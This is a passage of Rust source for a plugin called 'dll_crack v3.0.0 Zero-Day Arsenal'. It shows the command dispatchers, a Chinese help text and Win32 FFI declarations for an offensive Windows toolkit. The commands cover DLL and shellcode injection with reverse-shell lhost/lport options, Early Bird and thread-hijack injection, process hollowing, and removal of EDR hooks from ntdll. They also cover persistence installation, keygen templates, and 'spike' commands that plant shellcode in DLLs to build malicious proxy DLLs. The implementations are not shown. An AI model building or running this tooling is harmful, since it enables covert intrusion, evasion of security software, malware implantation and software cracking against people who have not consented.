        "reflective" => { if parts.len()<3 { Err("用法: reflective <pid> <dll_path>".into()) } else { reflective_inject(parts[1], parts[2]) } }
        "unhook"     => { if parts.len()<2 { Err("用法: unhook <pid>".into()) } else { ntdll_unhook(parts[1]) } }
        "sideload"   => { if parts.len()<2 { Err("用法: sideload <target_dir>".into()) } else { sideload_scan(parts[1]) } }
        "proxy"      => { if parts.len()<2 { Err("用法: proxy <target_dll> [out_dir]".into()) } else { proxy_gen(parts[1], parts.get(2).copied()) } }
        "iat"        => iat_dispatch(&parts),
        "strings"    => { if parts.len()<2 { Err("用法: strings <path> [min_len]".into()) } else { let ml = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(4); extract_strings(parts[1], ml) } }
        "decomp"     => { if parts.len()<2 { Err("用法: decomp <path>".into()) } else { decomp_dll(parts[1]) } }
        "export"     => { if parts.len()<2 { Err("用法: export <path>".into()) } else { export_dump(parts[1]) } }
        "cave"       => { let ms = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(64); if parts.len()<2 { Err("用法: cave <path> [min_size]".into()) } else { code_cave_scan(parts[1], ms) } }
        "sign"       => { if parts.len()<2 { Err("用法: sign <path>".into()) } else { sign_analyze(parts[1]) } }
        "entropy"    => { if parts.len()<2 { Err("用法: entropy <path>".into()) } else { entropy_scan(parts[1]) } }
        "disasm"     => disasm_dispatch(&parts),
        "resource"   => { if parts.len()<2 { Err("用法: resource <path> [extract_type] [out_dir]".into()) } else { resource_dump(parts[1], parts.get(2).copied(), parts.get(3).copied()) } }
        "search"     => { if parts.len()<3 { Err("用法: search <path> <hex_pattern>".into()) } else { byte_search(parts[1], parts[2]) } }
        "compare"    => { if parts.len()<3 { Err("用法: compare <path1> <path2>".into()) } else { pe_compare(parts[1], parts[2]) } }
        "tls"        => { if parts.len()<2 { Err("用法: tls <path>".into()) } else { tls_analyze(parts[1]) } }
        "rich"       => { if parts.len()<2 { Err("用法: rich <path>".into()) } else { rich_header(parts[1]) } }
        "loadconfig" => { if parts.len()<2 { Err("用法: loadconfig <path>".into()) } else { loadconfig_analyze(parts[1]) } }
        "exception"  => { if parts.len()<2 { Err("用法: exception <path>".into()) } else { exception_analyze(parts[1]) } }
        "bind"       => { if parts.len()<2 { Err("用法: bind <path>".into()) } else { bind_import(parts[1]) } }
        "delay"      => { if parts.len()<2 { Err("用法: delay <path>".into()) } else { delay_import(parts[1]) } }
        "dotnet"     => { if parts.len()<2 { Err("用法: dotnet <path>".into()) } else { dotnet_meta(parts[1]) } }
        "checksec"   => { if parts.len()<2 { Err("用法: checksec <path>".into()) } else { checksec(parts[1]) } }
        "cert"       => { if parts.len()<2 { Err("用法: cert <path> [output]".into()) } else { cert_extract(parts[1], parts.get(2).copied()) } }
        "dirty"      => { if parts.len()<2 { Err("用法: dirty <path>".into()) } else { dirty_check(parts[1]) } }
        "nop"        => nop_dispatch(&parts),
        "jmp_invert" => { if parts.len()<3 { Err("用法: jmp_invert <path> <offset>".into()) } else { jmp_invert(parts[1], parts[2]) } }
        "bypass"     => { if parts.len()<2 { Err("用法: bypass <path>".into()) } else { bypass_scan(parts[1]) } }
        "cryptoscan" => { if parts.len()<2 { Err("用法: cryptoscan <path>".into()) } else { crypto_scan(parts[1]) } }
        "serial_scan"=> { if parts.len()<2 { Err("用法: serial_scan <path>".into()) } else { serial_scan(parts[1]) } }
        "constants"  => { if parts.len()<2 { Err("用法: constants <path>".into()) } else { constants_scan(parts[1]) } }
        "anti_debug" => { if parts.len()<2 { Err("用法: anti_debug <path>".into()) } else { anti_debug_scan(parts[1]) } }
        "unpack_detect"=>{ if parts.len()<2 { Err("用法: unpack_detect <path>".into()) } else { unpack_detect(parts[1]) } }
        "xor_scan"   => { if parts.len()<2 { Err("用法: xor_scan <path> [min_len]".into()) } else { let ml = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(16); xor_scan(parts[1], ml) } }
        "hook_scan"  => { if parts.len()<2 { Err("用法: hook_scan <pid> [module]".into()) } else { hook_scan(parts[1], parts.get(2).copied().unwrap_or("ntdll.dll")) } }
        "mem_read"   => mem_read_dispatch(&parts),
        "mem_write"  => { if parts.len()<4 { Err("用法: mem_write <pid> <address> <hex>".into()) } else { mem_write(parts[1], parts[2], parts[3]) } }
        "syscall"    => { syscall_table(parts.get(1).copied().unwrap_or("list")) }
        "persist"    => { if parts.len()<3 { Err("用法: persist <method> <path>".into()) } else { persist_install(parts[1], parts[2]) } }
        "section_add"=> { if parts.len()<4 { Err("用法: section_add <path> <name> <data_or_size>".into()) } else { section_add(parts[1], parts[2], parts[3]) } }
        "keygen_template"=>{ if parts.len()<2 { Err("用法: keygen_template <algo> [out_dir]".into()) } else { keygen_template(parts[1], parts.get(2).copied()) } }
        "patch_search"=>{ if parts.len()<2 { Err("用法: patch_search <path>".into()) } else { patch_search(parts[1]) } }
        "func_hook"  => { if parts.len()<4 { Err("用法: func_hook <pid> <module!func> <shellcode>".into()) } else { func_hook(parts[1], parts[2], parts[3]) } }
        "inject_early"=>{ if parts.len()<3 { Err("用法: inject_early <exe> <shellcode|dll>".into()) } else { inject_early_bird(parts[1], parts[2]) } }
        "inject_hijack"=>{if parts.len()<3 { Err("用法: inject_hijack <pid> <shellcode> [tid]".into()) } else { inject_thread_hijack(parts[1], parts[2], parts.get(3).copied()) } }
        "inject_hook" => { if parts.len()<2 { Err("用法: inject_hook <dll> [type]".into()) } else { inject_windows_hook(parts[1], parts.get(2).copied().unwrap_or("keyboard")) } }
        "code_inject" => { if parts.len()<3 { Err("用法: code_inject <pid> <shellcode>".into()) } else { code_inject_raw(parts[1], parts[2]) } }
        "hollow"     => { if parts.len()<3 { Err("用法: hollow <target_exe> <replacement_pe>".into()) } else { process_hollow(parts[1], parts[2]) } }
        "spike"      => { if parts.len()<3 { Err("用法: spike <dll> <shellcode> [out]".into()) } else { dll_spike_cmd(parts[1], parts[2], parts.get(3).copied()) } }
        "spike_proxy"=> { if parts.len()<3 { Err("用法: spike_proxy <dll> <shellcode> [out_dir]".into()) } else { spike_proxy_gen(parts[1], parts[2], parts.get(3).copied()) } }
        "spike_export"=>{ if parts.len()<3 { Err("用法: spike_export <dll> <func|*> <shellcode>".into()) } else { spike_export_hijack(parts[1], parts[2], parts[3]) } }
        "spike_cave" => { if parts.len()<3 { Err("用法: spike_cave <dll> <shellcode>".into()) } else { spike_cave_stuff(parts[1], parts[2]) } }
        "help-crack" => Ok(help_text()),
        _ => Err(format!("未知命令: {}", parts[0]))
    }
}

fn help_text() -> String {
    let mut h = String::new();
    h.push_str("\n");
    h.push_str("  dll_crack v3.0.0  Zero-Day Arsenal\n");
    h.push_str("  plugin_call dll_crack \"<cmd> [args]\"\n");
    h.push_str("\n");
    h.push_str("  [PE]\n");
    h.push_str("    analyze     PE头/节/导出/导入/TLS/重定位/CLR\n");
    h.push_str("    strings     提取ASCII/UTF-16字符串\n");
    h.push_str("    export      导出表\n");
    h.push_str("    iat         导入地址表(查看/修改)\n");
    h.push_str("    tls         TLS回调表\n");
    h.push_str("    rich        Rich头/编译器指纹\n");
    h.push_str("    loadconfig  加载配置/安全cookie\n");
    h.push_str("    exception   异常处理表\n");
    h.push_str("    bind        绑定导入\n");
    h.push_str("    delay       延迟加载导入\n");
    h.push_str("    dotnet      .NET元数据/CLR头\n");
    h.push_str("    resource    资源节(提取)\n");
    h.push_str("    sign        数字签名分析\n");
    h.push_str("    entropy     熵值分布\n");
    h.push_str("    cert        提取/查看证书\n");
    h.push_str("    dirty       脏位/可疑标记\n");
    h.push_str("    checksec    安全缓解检查\n");
    h.push_str("    decomp      反编译(.NET/伪代码)\n");
    h.push_str("    compare     二进制对比\n");
    h.push_str("\n");
    h.push_str("  [SCAN]\n");
    h.push_str("    search      十六进制字节搜索\n");
    h.push_str("    cave        代码洞扫描\n");
    h.push_str("    xor_scan    XOR编码检测\n");
    h.push_str("    patch_search 常见patch点\n");
    h.push_str("    bypass      绕过机会检测\n");
    h.push_str("    cryptoscan  密码常量扫描\n");
    h.push_str("    serial_scan 序列号/密钥模式\n");
    h.push_str("    constants   魔术常量识别\n");
    h.push_str("    anti_debug  反调试检测\n");
    h.push_str("    unpack_detect 壳检测\n");
    h.push_str("\n");
    h.push_str("  [DISASM]\n");
    h.push_str("    disasm      x86/x64反汇编\n");
    h.push_str("\n");
    h.push_str("  [PATCH]\n");
    h.push_str("    patch       HEX字节修补\n");
    h.push_str("    nop         NOP填充\n");
    h.push_str("    jmp_invert  条件跳转反转\n");
    h.push_str("    section_add 添加新节\n");
    h.push_str("\n");
    h.push_str("  [INJECT]\n");
    h.push_str("    inject      标准DLL注入(crt/apc)\n");
    h.push_str("    reflective  反射式加载(无痕)\n");
    h.push_str("    shellcode   Payload注入\n");
    h.push_str("    inject_early Early Bird注入\n");
    h.push_str("    inject_hijack 线程劫持注入\n");
    h.push_str("    inject_hook SetWindowsHookEx注入\n");
    h.push_str("    code_inject 裸shellcode注入\n");
    h.push_str("\n");
    h.push_str("  [HOLLOW]\n");
    h.push_str("    hollow      进程挖空替换PE\n");
    h.push_str("\n");
    h.push_str("  [HIJACK]\n");
    h.push_str("    hijack      DLL劫持机会扫描\n");
    h.push_str("    sideload    侧加载漏洞扫描\n");
    h.push_str("\n");
    h.push_str("  [MEMORY]\n");
    h.push_str("    mem_read    读进程内存\n");
    h.push_str("    mem_write   写进程内存\n");
    h.push_str("    hook_scan   EDR钩子扫描\n");
    h.push_str("    func_hook   函数inline hook\n");
    h.push_str("\n");
    h.push_str("  [EVASION]\n");
    h.push_str("    unhook      NTDLL脱钩(去EDR钩子)\n");
    h.push_str("    syscall     Syscall号/生成syscall stub\n");
    h.push_str("\n");
    h.push_str("  [DUMP]\n");
    h.push_str("    dump        进程模块转储\n");
    h.push_str("\n");
    h.push_str("  [PROXY]\n");
    h.push_str("    proxy       DLL代理生成\n");
    h.push_str("\n");
    h.push_str("  [PERSIST]\n");
    h.push_str("    persist     持久化安装\n");
    h.push_str("\n");
    h.push_str("  [KEYGEN]\n");
    h.push_str("    keygen_template Keygen模板\n");
    h.push_str("\n");
    h.push_str("  [SPIKE]\n");
    h.push_str("    spike       DLL加料(新节+shellcode)\n");
    h.push_str("    spike_proxy 恶意代理DLL\n");
    h.push_str("    spike_export 导出劫持加料\n");
    h.push_str("    spike_cave  代码洞填充\n");
    h.push_str("\n");
    h
}

fn shellcode_dispatch(parts: &[&str]) -> Result<String, String> {
    if parts.len() < 2 { return Err("用法: shellcode <pid> [payload] [lhost] [lport]".into()); }
    let payload = parts.get(2).copied().unwrap_or("messagebox");
    let lhost = parts.get(3).copied().unwrap_or("");
    let lport = parts.get(4).copied().unwrap_or("4444");
    shellcode_inject(parts[1], payload, lhost, lport)
}

fn iat_dispatch(parts: &[&str]) -> Result<String, String> {
    if parts.len() < 2 { return Err("用法: iat <path> [patch_dll] [patch_func] [new_dll] [new_func]".into()); }
    let path = parts[1];
    let pd = parts.get(2).copied();
    let pf = parts.get(3).copied();
    let nd = parts.get(4).copied();
    let nf = parts.get(5).copied();
    match (pd, pf, nd, nf) {
        (Some(pd), Some(pf), Some(nd), Some(nf)) => iat_patch(path, pd, pf, nd, nf),
        _ => iat_dump(path),
    }
}

fn mem_read_dispatch(parts: &[&str]) -> Result<String, String> {
    if parts.len() < 3 { return Err("用法: mem_read <pid> <address> [size]".into()); }
    let pid_str = parts[1];
    let addr = parse_usize_hex(parts[2]).ok_or("无效地址")?;
    let size = parts.get(3).and_then(|s| s.parse().ok()).unwrap_or(256).min(4096);
    mem_read(pid_str, addr, size)
}

fn parse_usize_hex(s: &str) -> Option<usize> {
    if s.starts_with("0x") || s.starts_with("0X") {
        usize::from_str_radix(&s[2..], 16).ok()
    } else {
        s.parse::<usize>().ok()
    }
}

fn nop_dispatch(parts: &[&str]) -> Result<String, String> {
    if parts.len() < 3 { return Err("用法: nop <path> <rva_or_offset> [size]".into()); }
    let path = parts[1];
    let offset = parts[2].parse::<usize>().ok().or_else(|| {
        if parts[2].starts_with("0x") || parts[2].starts_with("0X") {
            usize::from_str_radix(&parts[2][2..], 16).ok()
        } else { None }
    }).ok_or("无效偏移")?;
    let size = parts.get(3).and_then(|s| s.parse().ok());
    smart_nop(path, offset, size)
}

fn disasm_dispatch(parts: &[&str]) -> Result<String, String> {
    if parts.len() < 2 { return Err("用法: disasm <path> [rva] [count]".into()); }
    let path = parts[1];
    let rva = parts.get(2).and_then(|s| {
        if s.starts_with("0x") || s.starts_with("0X") { usize::from_str_radix(&s[2..], 16).ok() }
        else { s.parse::<usize>().ok() }
    }).map(|v| v as u32);
    let count = parts.get(3).and_then(|s| s.parse().ok()).unwrap_or(50);
    disassemble(path, rva, count)
}

fn dispatch_json(cmd: &str, json: &serde_json::Value) -> Result<String, String> {
    match cmd {
        "analyze" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            pe_analyze(path, true)
        }
        "inject" => {
            let pid_str = json_val_to_str(json, "pid")?;
            let path = json.get("dll_path").and_then(|v| v.as_str()).ok_or("缺少dll_path")?;
            let method = json.get("method").and_then(|v| v.as_str()).unwrap_or("crt");
            dll_inject_cmd(&pid_str, path, method)
        }
        "hijack" => {
            let mode = json.get("scan_mode").and_then(|v| v.as_str()).unwrap_or("all");
            dll_hijack_cmd(mode)
        }
        "patch" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let offset = json.get("offset").and_then(|v| v.as_i64()).map(|v| v.to_string()).ok_or("缺少offset")?;
            let hex = json.get("hex_bytes").and_then(|v| v.as_str()).ok_or("缺少hex_bytes")?;
            dll_patch_cmd(path, &offset, hex)
        }
        "shellcode" => {
            let pid_str = json_val_to_str(json, "pid")?;
            let payload = json.get("payload").and_then(|v| v.as_str()).unwrap_or("messagebox");
            let lhost = json.get("lhost").and_then(|v| v.as_str()).unwrap_or("");
            let lport = json.get("lport").and_then(|v| v.as_i64()).map(|v| v.to_string()).unwrap_or_else(|| "4444".to_string());
            shellcode_inject(&pid_str, payload, lhost, &lport)
        }
        "dump" => {
            let pid_str = json_val_to_str(json, "pid")?;
            let module = json.get("module_name").and_then(|v| v.as_str()).ok_or("缺少module_name")?;
            let out = json.get("output_path").and_then(|v| v.as_str());
            module_dump(&pid_str, module, out)
        }
        "reflective" => {
            let pid_str = json_val_to_str(json, "pid")?;
            let path = json.get("dll_path").and_then(|v| v.as_str()).ok_or("缺少dll_path")?;
            reflective_inject(&pid_str, path)
        }
        "unhook" => {
            let pid_str = json_val_to_str(json, "pid")?;
            ntdll_unhook(&pid_str)
        }
        "sideload" => {
            let dir = json.get("target_dir").and_then(|v| v.as_str()).ok_or("缺少target_dir")?;
            sideload_scan(dir)
        }
        "proxy" => {
            let dll = json.get("target_dll").and_then(|v| v.as_str()).ok_or("缺少target_dll")?;
            let out = json.get("output_dir").and_then(|v| v.as_str());
            proxy_gen(dll, out)
        }
        "iat" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let pd = json.get("patch_dll").and_then(|v| v.as_str());
            let pf = json.get("patch_func").and_then(|v| v.as_str());
            let nd = json.get("new_dll").and_then(|v| v.as_str());
            let nf = json.get("new_func").and_then(|v| v.as_str());
            match (pd, pf, nd, nf) {
                (Some(pd), Some(pf), Some(nd), Some(nf)) => iat_patch(path, pd, pf, nd, nf),
                _ => iat_dump(path),
            }
        }
        "strings" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let min_len = json.get("min_len").and_then(|v| v.as_i64()).unwrap_or(4) as usize;
            extract_strings(path, min_len)
        }
        "decomp" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            decomp_dll(path)
        }
        "export" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            export_dump(path)
        }
        "cave" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let min_size = json.get("min_size").and_then(|v| v.as_i64()).unwrap_or(64) as usize;
            code_cave_scan(path, min_size)
        }
        "sign" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            sign_analyze(path)
        }
        "entropy" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            entropy_scan(path)
        }
        "disasm" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let rva = json.get("rva").and_then(|v| v.as_i64()).map(|v| v as u32);
            let count = json.get("count").and_then(|v| v.as_i64()).unwrap_or(50) as usize;
            disassemble(path, rva, count)
        }
        "resource" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let extract_type = json.get("extract_type").and_then(|v| v.as_str()).unwrap_or("all");
            let out_dir = json.get("output_dir").and_then(|v| v.as_str());
            resource_dump(path, Some(extract_type), out_dir)
        }
        "search" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let hex_pattern = json.get("hex_pattern").and_then(|v| v.as_str()).ok_or("缺少hex_pattern")?;
            byte_search(path, hex_pattern)
        }
        "compare" => {
            let path1 = json.get("path1").and_then(|v| v.as_str()).ok_or("缺少path1")?;
            let path2 = json.get("path2").and_then(|v| v.as_str()).ok_or("缺少path2")?;
            pe_compare(path1, path2)
        }
        "tls" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            tls_analyze(path)
        }
        "rich" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            rich_header(path)
        }
        "loadconfig" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            loadconfig_analyze(path)
        }
        "exception" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            exception_analyze(path)
        }
        "bind" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            bind_import(path)
        }
        "delay" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            delay_import(path)
        }
        "dotnet" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            dotnet_meta(path)
        }
        "checksec" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            checksec(path)
        }
        "cert" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let output = json.get("output").and_then(|v| v.as_str());
            cert_extract(path, output)
        }
        "dirty" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            dirty_check(path)
        }
        "nop" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let offset = json.get("rva_or_offset").and_then(|v| v.as_i64()).ok_or("缺少rva_or_offset")? as usize;
            let size = json.get("size").and_then(|v| v.as_i64()).map(|v| v as usize);
            smart_nop(path, offset, size)
        }
        "jmp_invert" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let offset_str = json.get("offset").and_then(|v| v.as_i64()).ok_or("缺少offset")?.to_string();
            jmp_invert(path, &offset_str)
        }
        "bypass" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            bypass_scan(path)
        }
        "cryptoscan" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            crypto_scan(path)
        }
        "serial_scan" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            serial_scan(path)
        }
        "constants" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            constants_scan(path)
        }
        "anti_debug" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            anti_debug_scan(path)
        }
        "unpack_detect" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            unpack_detect(path)
        }
        "xor_scan" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let min_len = json.get("min_len").and_then(|v| v.as_i64()).unwrap_or(16) as usize;
            xor_scan(path, min_len)
        }
        "hook_scan" => {
            let pid_str = json_val_to_str(json, "pid")?;
            let module = json.get("module").and_then(|v| v.as_str()).unwrap_or("ntdll.dll");
            hook_scan(&pid_str, module)
        }
        "mem_read" => {
            let pid_str = json_val_to_str(json, "pid")?;
            let addr = json.get("address").and_then(|v| v.as_i64()).ok_or("缺少address")? as usize;
            let size = json.get("size").and_then(|v| v.as_i64()).unwrap_or(256) as usize;
            mem_read(&pid_str, addr, size.min(4096))
        }
        "mem_write" => {
            let pid_str = json_val_to_str(json, "pid")?;
            let addr_str = json.get("address").and_then(|v| v.as_i64()).ok_or("缺少address")?.to_string();
            let hex = json.get("hex_bytes").and_then(|v| v.as_str()).ok_or("缺少hex_bytes")?;
            mem_write(&pid_str, &addr_str, hex)
        }
        "syscall" => {
            let name = json.get("syscall_name").and_then(|v| v.as_str()).unwrap_or("list");
            syscall_table(name)
        }
        "persist" => {
            let method = json.get("method").and_then(|v| v.as_str()).ok_or("缺少method")?;
            let path = json.get("payload_path").and_then(|v| v.as_str()).ok_or("缺少payload_path")?;
            persist_install(method, path)
        }
        "section_add" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let name = json.get("section_name").and_then(|v| v.as_str()).ok_or("缺少section_name")?;
            let data = json.get("data_hex_or_size").and_then(|v| v.as_str()).ok_or("缺少data_hex_or_size")?;
            section_add(path, name, data)
        }
        "keygen_template" => {
            let algo = json.get("algorithm").and_then(|v| v.as_str()).ok_or("缺少algorithm")?;
            let out = json.get("output_dir").and_then(|v| v.as_str());
            keygen_template(algo, out)
        }
        "patch_search" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            patch_search(path)
        }
        "func_hook" => {
            let pid_str = json_val_to_str(json, "pid")?;
            let func_spec = json.get("func_spec").and_then(|v| v.as_str()).ok_or("缺少func_spec")?;
            let sc = json.get("shellcode_hex").and_then(|v| v.as_str()).ok_or("缺少shellcode_hex")?;
            func_hook(&pid_str, func_spec, sc)
        }
        "inject_early" => {
            let exe = json.get("exe_path").and_then(|v| v.as_str()).ok_or("缺少exe_path")?;
            let sc = json.get("shellcode_hex_or_dll").and_then(|v| v.as_str()).ok_or("缺少shellcode_hex_or_dll")?;
            inject_early_bird(exe, sc)
        }
        "inject_hijack" => {
            let pid_str = json_val_to_str(json, "pid")?;
            let sc = json.get("shellcode_hex").and_then(|v| v.as_str()).ok_or("缺少shellcode_hex")?;
            let tid = json.get("thread_id").and_then(|v| v.as_i64()).map(|v| v.to_string());
            inject_thread_hijack(&pid_str, sc, tid.as_deref())
        }
        "inject_hook" => {
            let dll = json.get("dll_path").and_then(|v| v.as_str()).ok_or("缺少dll_path")?;
            let ht = json.get("hook_type").and_then(|v| v.as_str()).unwrap_or("keyboard");
            inject_windows_hook(dll, ht)
        }
        "code_inject" => {
            let pid_str = json_val_to_str(json, "pid")?;
            let sc = json.get("shellcode_hex").and_then(|v| v.as_str()).ok_or("缺少shellcode_hex")?;
            code_inject_raw(&pid_str, sc)
        }
        "hollow" => {
            let target = json.get("target_exe").and_then(|v| v.as_str()).ok_or("缺少target_exe")?;
            let repl = json.get("replacement_pe").and_then(|v| v.as_str()).ok_or("缺少replacement_pe")?;
            process_hollow(target, repl)
        }
        "spike" => {
            let dll = json.get("dll_path").and_then(|v| v.as_str()).ok_or("缺少dll_path")?;
            let sc = json.get("shellcode_hex").and_then(|v| v.as_str()).ok_or("缺少shellcode_hex")?;
            let out = json.get("output").and_then(|v| v.as_str());
            dll_spike_cmd(dll, sc, out)
        }
        "spike_proxy" => {
            let dll = json.get("target_dll").and_then(|v| v.as_str()).ok_or("缺少target_dll")?;
            let sc = json.get("shellcode_hex").and_then(|v| v.as_str()).ok_or("缺少shellcode_hex")?;
            let out = json.get("output_dir").and_then(|v| v.as_str());
            spike_proxy_gen(dll, sc, out)
        }
        "spike_export" => {
            let dll = json.get("dll_path").and_then(|v| v.as_str()).ok_or("缺少dll_path")?;
            let func = json.get("export_func").and_then(|v| v.as_str()).ok_or("缺少export_func")?;
            let sc = json.get("shellcode_hex").and_then(|v| v.as_str()).ok_or("缺少shellcode_hex")?;
            spike_export_hijack(dll, func, sc)
        }
        "spike_cave" => {
            let dll = json.get("dll_path").and_then(|v| v.as_str()).ok_or("缺少dll_path")?;
            let sc = json.get("shellcode_hex").and_then(|v| v.as_str()).ok_or("缺少shellcode_hex")?;
            spike_cave_stuff(dll, sc)
        }
        "help-crack" => Ok(help_text()),
        _ => Err(format!("未知命令: {}", cmd))
    }
}

fn json_val_to_str(json: &serde_json::Value, key: &str) -> Result<String, String> {
    if let Some(s) = json.get(key).and_then(|v| v.as_str()) { return Ok(s.to_string()); }
    if let Some(n) = json.get(key).and_then(|v| v.as_i64()) { return Ok(n.to_string()); }
    Err(format!("缺少{}", key))
}

// ═══════════════ Windows FFI 声明 (v2.0 扩展) ═══════════════

#[allow(dead_code, non_camel_case_types)]
mod win32 {
    use std::os::raw::c_void;
    pub type HANDLE = *mut c_void;
    pub type LPVOID = *mut c_void;
    pub type DWORD = u32;
    pub type LPDWORD = *mut u32;
    pub type SIZE_T = usize;
    pub type BOOL = i32;
    pub type HMODULE = *mut c_void;
    pub type FARPROC = *mut c_void;
    pub type LPCSTR = *const u8;
    pub type LPTHREAD_START_ROUTINE = *mut c_void;
    pub type ULONG_PTR = usize;
    pub type LONG = i32;

    pub const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
    pub const PROCESS_CREATE_THREAD: DWORD = 0x0002;
    pub const PROCESS_QUERY_INFORMATION: DWORD = 0x0400;
    pub const PROCESS_VM_OPERATION: DWORD = 0x0008;
    pub const PROCESS_VM_WRITE: DWORD = 0x0020;
    pub const PROCESS_VM_READ: DWORD = 0x0010;
    pub const PROCESS_SET_INFORMATION: DWORD = 0x0200;
    pub const PROCESS_SUSPEND_RESUME: DWORD = 0x0800;
    pub const MEM_COMMIT: DWORD = 0x1000;
    pub const MEM_RESERVE: DWORD = 0x2000;
    pub const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
    pub const PAGE_READWRITE: DWORD = 0x04;
    pub const PAGE_EXECUTE_READ: DWORD = 0x20;
    pub const PAGE_READONLY: DWORD = 0x02;
    pub const TH32CS_SNAPPROCESS: DWORD = 0x02;
    pub const TH32CS_SNAPMODULE: DWORD = 0x08;
    pub const TH32CS_SNAPMODULE32: DWORD = 0x10;
    pub const TH32CS_SNAPTHREAD: DWORD = 0x04;
    pub const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;
    pub const INFINITE: DWORD = 0xFFFFFFFF;
    pub const WAIT_OBJECT_0: DWORD = 0;
    pub const THREAD_SET_CONTEXT: DWORD = 0x0010;
    pub const THREAD_GET_CONTEXT: DWORD = 0x0008;
    pub const THREAD_SUSPEND_RESUME: DWORD = 0x0002;
    pub const CONTEXT_FULL: DWORD = 0x10007;
    pub const CONTEXT_CONTROL: DWORD = 0x10001;

    #[repr(C)] pub struct PROCESSENTRY32 {
        pub dw_size: DWORD, pub cnt_usage: DWORD, pub th32_process_id: DWORD,
        pub th32_default_heap_id: usize, pub th32_module_id: DWORD,
        pub cnt_threads: DWORD, pub th32_parent_process_id: DWORD,
        pub pc_pri_class_base: i32, pub dw_flags: DWORD,
        pub sz_exe_file: [u8; 260],
    }

    #[repr(C)] pub struct MODULEENTRY32 {
        pub dw_size: DWORD, pub th32_module_id: DWORD, pub th32_process_id: DWORD,
        pub glblcnt_usage: DWORD, pub proccnt_usage: DWORD,
        pub mod_base_addr: *mut u8, pub mod_base_size: DWORD, pub h_module: HMODULE,
        pub sz_module: [u8; 256], pub sz_exe_path: [u8; 260],
    }

    #[repr(C)] pub struct THREADENTRY32 {
        pub dw_size: DWORD, pub cnt_usage: DWORD, pub th32_thread_id: DWORD,
        pub th32_owner_process_id: DWORD, pub tp_base_pri: LONG,
        pub tp_delta_pri: LONG, pub dw_flags: DWORD,
    }

    extern "system" {
        pub fn OpenProcess(dw_desired_access: DWORD, b_inherit_handle: BOOL, dw_process_id: DWORD) -> HANDLE;
        pub fn CloseHandle(h_object: HANDLE) -> BOOL;
        pub fn VirtualAllocEx(h_process: HANDLE, lp_address: LPVOID, dw_size: SIZE_T, fl_allocation_type: DWORD, fl_protect: DWORD) -> LPVOID;
        pub fn VirtualFreeEx(h_process: HANDLE, lp_address: LPVOID, dw_size: SIZE_T, dw_free_type: DWORD) -> BOOL;
        pub fn VirtualProtectEx(h_process: HANDLE, lp_address: LPVOID, dw_size: SIZE_T, fl_new_protect: DWORD, lpfl_old_protect: *mut DWORD) -> BOOL;
        pub fn WriteProcessMemory(h_process: HANDLE, lp_base_address: LPVOID, lp_buffer: *const c_void, n_size: SIZE_T, lp_number_of_bytes_written: *mut SIZE_T) -> BOOL;
        pub fn ReadProcessMemory(h_process: HANDLE, lp_base_address: LPVOID, lp_buffer: LPVOID, n_size: SIZE_T, lp_number_of_bytes_read: *mut SIZE_T) -> BOOL;
        pub fn CreateRemoteThread(h_process: HANDLE, lp_thread_attributes: LPVOID, dw_stack_size: SIZE_T, lp_start_address: LPTHREAD_START_ROUTINE, lp_parameter: LPVOID, dw_creation_flags: DWORD, lp_thread_id: LPDWORD) -> HANDLE;
        pub fn WaitForSingleObject(h_handle: HANDLE, dw_milliseconds: DWORD) -> DWORD;
        pub fn GetProcAddress(h_module: HMODULE, lp_proc_name: LPCSTR) -> FARPROC;
        pub fn GetModuleHandleA(lp_module_name: LPCSTR) -> HMODULE;
        pub fn LoadLibraryA(lp_lib_file_name: LPCSTR) -> HMODULE;
        pub fn CreateToolhelp32Snapshot(dw_flags: DWORD, th32_process_id: DWORD) -> HANDLE;
        pub fn Process32First(h_snapshot: HANDLE, lppe: *mut PROCESSENTRY32) -> BOOL;
